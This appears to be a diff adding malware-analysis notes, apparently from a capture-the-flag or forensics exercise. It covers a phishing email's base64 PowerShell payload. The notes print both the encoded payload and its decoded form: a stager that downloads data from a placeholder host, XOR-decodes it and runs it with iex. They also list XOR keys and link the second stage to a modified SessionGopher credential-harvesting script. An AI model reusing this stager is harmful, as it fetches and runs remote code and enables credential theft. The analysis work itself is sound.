@@ -1,0 +1,33 @@
+email 15 has a small base64 payload:
+
+JABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AZgBkAHgAZAB6AC4AaQBuAHYAYQBsAGkAZAAvAHAAcgBlAHMAcwB1AHIAZQAnACkACgAKACQAcAByAGUAdgAgAD0AIABbAGIAeQB0AGUAXQAgADEAOQA1AAoACgAkAGQAZQBjACAAPQAgACQAKABmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABiAHkAdABlAHMALgBsAGUAbgBnAHQAaAA7ACAAJABpACsAKwApACAAewAKACAAIAAgACAAJABwAHIAZQB2ACAAPQAgACQAYgB5AHQAZQBzAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAHAAcgBlAHYACgAgACAAIAAgACQAcAByAGUAdgAKAH0AKQAKAAoAaQBlAHgAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGQAZQBjACkAKQAKAA==
+
+decodes to:
+
+$bytes = (New-Object Net.WebClient).DownloadData('http://fdxdz.invalid/pressure')
+
+$prev = [byte] 195
+
+$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
+    $prev = $bytes[$i] -bxor $prev
+    $prev
+})
+
+iex([System.Text.Encoding]::UTF8.GetString($dec))
+
+saved the payload from the pcap and put it in decode.ps1
+
+output in stage2.ps1
+
+looks like a modified version of https://github.com/Arvanaghi/SessionGopher/blob/master/SessionGopher.ps1
+
+decision key: 0x7f
+pressure key: 0xc3
+question key: 0xee
+
+(input differential xor in cyberchef)
+
+---------------------------
+
+message id: 161587476200.22130.14940889683999626188@oops.net
+domain: cfzfp.invalid
